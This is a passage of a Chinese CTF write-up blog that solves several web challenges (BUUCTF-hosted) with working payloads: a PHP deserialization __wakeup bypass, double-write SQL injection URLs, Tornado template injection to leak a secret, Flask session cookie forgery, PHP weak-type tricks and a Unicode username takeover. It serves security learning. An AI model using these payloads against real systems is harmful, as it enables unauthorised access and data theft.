alt="image-20220109163404711"></p><p>可以看到phpinfo内很多命令执行的函数被禁用，但是没有禁用诸如 var_dump,scan_dir,next,highlight_file 这类可以对文件扫描读取的函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091635556.png" alt="image-20220109163527463"></p><p>构建 <code>? num=var_dump(scandir(chr(47)))</code> 对根目录扫描 chr(47) =&gt; ‘/‘</p><p>最终payload <code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>首页直接提示备份源码，<a href="http://www.zip/">www.zip</a> 找到源码</p><p>在index.php中发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>  <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>  <span class="hljs-variable">$res</span>=unserialize(@<span class="hljs-variable">$select</span>);<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看来是反序列化 跟进class.php，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();          <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那我们只要让 usernmae=admin,password=100即可，构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br>    <span class="hljs-comment">//结果：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="hljs-comment">//别忘了还有一个 __wakeup 这会影响到username ，可以修改 Name后的数值来绕过 CVE-2016-7124</span><br><span class="hljs-comment">//这个payload 就行 index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>经过测试过滤了很多sql函数，不能大写绕过，但是可以双写</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">160</span>d<span class="hljs-number">7</span>b<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">-1080</span><span class="hljs-number">-467</span>d<span class="hljs-number">-9261</span><span class="hljs-number">-01</span>cef<span class="hljs-number">19e14</span>f<span class="hljs-number">3</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span>admin&#x27; ununionion seselectlect <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>group_concat(table_name)frfromom(infoorrmation_schema.tables)<br>whwhereere table_schema<span class="hljs-operator">=</span>database() <span class="hljs-variable">%23</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-number">7852e8</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ffdf<span class="hljs-number">99e34</span>f<span class="hljs-number">06e3</span>cbc<span class="hljs-number">9</span>ebcb<span class="hljs-number">5</span><br>最终payload<br><span class="hljs-symbol">http:</span>//<span class="hljs-number">160</span>d<span class="hljs-number">7</span>b<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">-1080</span><span class="hljs-number">-467</span>d<span class="hljs-number">-9261</span><span class="hljs-number">-01</span>cef<span class="hljs-number">19e14</span>f<span class="hljs-number">3</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/check.php?username<span class="hljs-operator">=</span>admin&amp;password<span class="hljs-operator">=</span>pwd <span class="hljs-variable">%27</span> ununionion seselectlect <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)frfromom(ctf.Flag)<span class="hljs-variable">%23</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-number">7852e8</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ffdf<span class="hljs-number">99e34</span>f<span class="hljs-number">06e3</span>cbc<span class="hljs-number">9</span>ebcb<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>经过测试，备份文件名为 index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = intval(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><p>那么我们直接传入 ?key=123 即可</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>看到一下信息</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">welcome.txt</span><br><span class="ruby"></span>render            #联想到ssti<br>-<span class="ruby">/flag <span class="hljs-comment">#</span></span><br><span class="ruby"></span>flag in /fllllllllllllag<br>-<span class="ruby">hints.txt</span><br><span class="ruby"></span>md5(cookie_secret+md5(filename))  getflag方法<br></code></pre></td></tr></table></figure><p>利用</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">/error?msg=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>获取cookie_secret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><br>filename=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span><br>cookie_secret=<span class="hljs-string">&quot;02b76ca5-817f-4887-baf1-a6c7556d97a5&quot;</span><br><span class="hljs-built_in">hash</span>.update(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((cookie_secret+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091801316.png" alt="image-20220109180135246"></p><p>最后传入，获取flag 唉 这题好也不好 相关参数都没说明 参与感有点弱 知识点倒是不难</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/file?filename<span class="hljs-operator">=</span>/fllllllllllllag&amp;filehash<span class="hljs-operator">=</span><span class="hljs-number">36</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">34</span>a<span class="hljs-number">3</span>b<span class="hljs-number">5</span>f<span class="hljs-number">640</span>a<span class="hljs-number">3</span>be<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">664536</span><span class="hljs-keyword">c</span><span class="hljs-number">8e81</span><br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>可以很容易联想到 这一定会和修改HTTP数据包有关</p><p>在MENU下拉菜单里，发现了 pay.php</p><p>得到 hints</p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p><p>FLAG NEED YOUR 100000000 MONEY</p></blockquote><p>源码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>有几个注意的点 上面这个php源码 考察php弱类型 我们让404a 和 404相比就可以通过</p><p>然后 money=100000000 但是 服务器接受不了这个数据 我们换成 1e10</p><p>同时在cookie中存在 user字段 把他修改成 1 就好(明显标志身份的变量非0即1)  数据包如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pay.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>24<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81/pay.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; user=1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="apache"><span class="hljs-attribute">password</span>=<span class="hljs-number">404</span>a&amp;money=<span class="hljs-number">1</span>e<span class="hljs-number">10</span></span><br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>没思路… ，看了看有三种解法</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>u:admin p:123</p><h3 id="Flask伪造session"><a href="#Flask伪造session" class="headerlink" title="Flask伪造session"></a>Flask伪造session</h3><p>怎么知道的是Flask，在用户登入之后 页面源代码给了git地址</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui grid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;four wide column&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eight wide column&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui form segment&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;field required&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>NewPassword<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;newpassword&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;newpassword&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui button fluid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;更换密码&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p>跟进github地址 进行源码审计</p><p><code>app/config.py</code> 发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>先对session进行解密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python .\flask_session_cookie_manager3.py decode -c .eJw90MGKwjAQBuBXWebsodH0UvBg6TasMAmV1DC5iK61NTYuVKW24rtv1gWPwz_zMTMP2By66tJAcu1u1QQ2xz0kD_jYQQLoUq-M9TI7MRzX3nrkaHIvHY7KlFPMlg2ZcqCxdUrT3RrsSZex1TVTGnsci9BfRla3Dg1xHBsnBQ7yb1YvHU4puBShWwzk9k4amlmdNyjy1opVq4T05GmGAu_BYyhWHkNNjrjSi5hcPZOiiDAr5vCcwPelO2yuP6fq_D4hrMqsod5mspEmkNknD-txFAWzWdrK8YuRX3slysCcuBK5w37-4o5-W1dvqRJxSsV_ct76EACDCdwuVff6GbAInr89XGmn.YdrY7g.FrFc4vSZxr6D-SNKQFbbl0mkZWw<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201092047501.png" alt="image-20220109204748408"></p><p>name字段是刚刚登陆的用户名 目标是让他变成admin</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python .\flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;20f9ff49535ffc81af6339e602aae2c9c961ec0a59e859303481e4e9c1f838c4c25e612c3f5364202b7c5f7e1a0aedde8cfbf70c19350df2f7b68909b874d404&#x27;, &#x27;csrf_token&#x27;: b&#x27;635ef0d3a5de818e880d5d0e725bef8e40988ac3&#x27;, &#x27;image&#x27;: b&#x27;xnAa&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure><p>之后用我们得到的 session对原session进行替换即可</p><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>比较经典但是不太容易想到的洞，在下面这个网站搜特定字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://unicode-table.com/en/search/?q=admin<br></code></pre></td></tr></table></figure><p>组成 ᴬᴰᴹᴵᴺ 注册一个账号 然后修改密码 即可修改 admin的密码</p><p>在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201092120281.png" alt="image-20220109212015184"></p><p>实际利用思路是这样 注册 ᴬᴰᴹᴵᴺ 经过一次 strlower =&gt; ADMIN  然后修改密码触发change函数内的strlower ADMIN =&gt; admin</p><p>这样实际上修改的就是admin的密码了</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>考察了三个MD5的点</p><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>一进环境，就一个框框，没啥思路，然后我curl了一下。在数据包中发现了这个Hint</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">RawContent        : HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>                    Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br>                    <span class="hljs-keyword">Connection</span>: keep-alive<br>                    Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)<br>                    Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>                    <span class="hljs-type">Date</span>: Mon, <span class="hljs-number">10</span> Jan <span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">14</span>:<span class="hljs-number">22.</span>..<br></code></pre></td></tr></table></figure><p>思路比较固定 <code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">大佬链接:http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>mslc.ctf.su<span class="hljs-operator">/</span>wp<span class="hljs-operator">/</span>leet<span class="hljs-operator">-</span>more<span class="hljs-number">-2010</span><span class="hljs-operator">-</span>oh<span class="hljs-operator">-</span>those<span class="hljs-operator">-</span>admins<span class="hljs-operator">-</span>writeup<span class="hljs-operator">/</span><br>意思是， <span class="hljs-keyword">SELECT</span> login <span class="hljs-keyword">FROM</span> admins <span class="hljs-keyword">WHERE</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&lt;trash&gt;&#x27;</span><span class="hljs-keyword">or</span><span 